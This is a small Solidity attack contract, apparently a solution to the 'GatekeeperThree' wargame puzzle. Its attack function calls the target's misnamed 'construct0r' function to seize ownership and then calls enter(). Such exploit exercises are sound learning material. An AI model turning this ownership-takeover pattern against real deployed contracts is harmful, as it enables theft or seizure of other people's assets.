// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./GatekeeperThree.sol";

contract AttackContract {

    address owner;
    constructor() {
        owner = msg.sender;
    }

    function attack(address payable gate) public {
        require(owner == msg.sender);
        GatekeeperThree(gate).construct0r();
        GatekeeperThree(gate).enter();
    }
}